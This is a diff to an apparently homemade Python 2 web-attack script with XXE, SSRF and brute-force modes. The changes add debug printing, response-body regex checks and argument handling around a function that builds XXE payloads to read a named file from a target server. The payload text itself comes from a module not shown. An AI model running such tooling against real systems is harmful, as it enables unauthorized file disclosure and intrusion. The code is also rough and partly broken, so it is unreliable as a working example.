@@ -1,6 +1,6 @@
 import request_maker
 import argparse
-import os
+import os,sys,re
 
 
 
@@ -21,17 +21,23 @@ def content_type_changer(content_type):
 
 def XXE_sample(uri,pdata,tp,content_type,target_file):
 
-	if(pdata!=""): #if pdata is not null
+	if(pdata!=None): #if pdata is not null
+		print 'pdata of xxe sample ' 
+		print pdata # always need a pdata
 	 	#target_file='file:///C:/Users/adrian/Desktop/rce.txt'
-	 	x=RM.Request_maker().XXEpayload(target_file) #your payload.
-		decoded=RM.Request_maker().URLdecode(pdata,tp,x,uri,content_type)
+	 	payload=RM.Request_maker().XXEpayload(target_file) #your payload.
+	 	
+		decoded=RM.Request_maker().URLdecode(pdata,tp,payload,uri,content_type) #as of now pobre does not care about target parameter if content-type is xml, but it must be change.
 		decode_pdata=decoded['post_data']
 		uri=decoded['decoded_url']
 	else:
+		print 'xxe sample, pdata is nulls, some get request here'
 		#target_file='file:///C:/Users/adrian/Desktop/rce.txt'
-	 	x=self.XXEpayload(target_file)
+	 	x=RM.Request_maker().XXEpayload(target_file)
+	 	print "your payload\n" + x
 		decoded=RM.Request_maker().URLdecode(None,tp,x,uri,content_type)
 		decode_pdata=decoded['post_data']
+		print 'decoded' + decode_pdata
 		uri=decoded['decoded_url']
 
 
@@ -44,8 +50,14 @@ def XXE_sample(uri,pdata,tp,content_type,target_file):
 	print '\n SOME RESPONSE \n';
 	container=RM.Request_maker().HTTPrequest(uri,None,header,decode_pdata)
 	#print container['header']
-	print container['targeturl'] + '\n\n'
 	#print container['get_data'] 
+	print "URL;" + container['targeturl'] + '\n\n'
+	print 'body:' + container['body'] 
+	regex=r'Invalid URI'
+	results=re.findall(regex,container['body'])
+	if(results[0]!=''):
+		print 'it works but some error here: ' + results[0]
+
 
 
 ############################################
@@ -83,7 +95,8 @@ def Brute_force(uri,pdata,tp,content_type):
 		print '\n SOME RESPONSE \n';
 		container=RM.Request_maker().HTTPrequest(uri,None,header,decode_pdata)
 		#print container['header']
-		print container['target_uri'] + '\n\n'
+		print "URL;" + container['target_uri'] + '\n\n'
+		print 'body:' + container['body'] 
 		#print container['get_data'] 
 	
 
@@ -103,7 +116,7 @@ def Brute_force(uri,pdata,tp,content_type):
 parser=argparse.ArgumentParser()
 parser.add_argument('uri',help="target url",type=str)
 parser.add_argument('--pdata','-pdata',help="POST parameters",type=str)
-parser.add_argument('target',help="target parameter", type=str)
+parser.add_argument('--target',help="target parameter", type=str)
 #parser.add_argument('--scan',help="scan type", type=str, choices=['service','port'])
 parser.add_argument('attack_type',help="type of  attack XXE,SSRF", type=str, choices=['XXE','SSRF'])
 #parser.add_argument('--techique',help="techique such as open redirect,remote XXE", type=str, choices=['OR','OOB'])
@@ -134,7 +147,10 @@ elif(type_of_attack=='SSRF' and content_type=='xml'):
 
 elif(type_of_attack=='SSRF' and tp==''):
 	print 'need a Target parameter'
-	exit()
+elif((content_type=='xml' or content_type=='json') and pdata==None):
+
+	print 'n0 post data here!'
+	sys.exit()
 
 
 
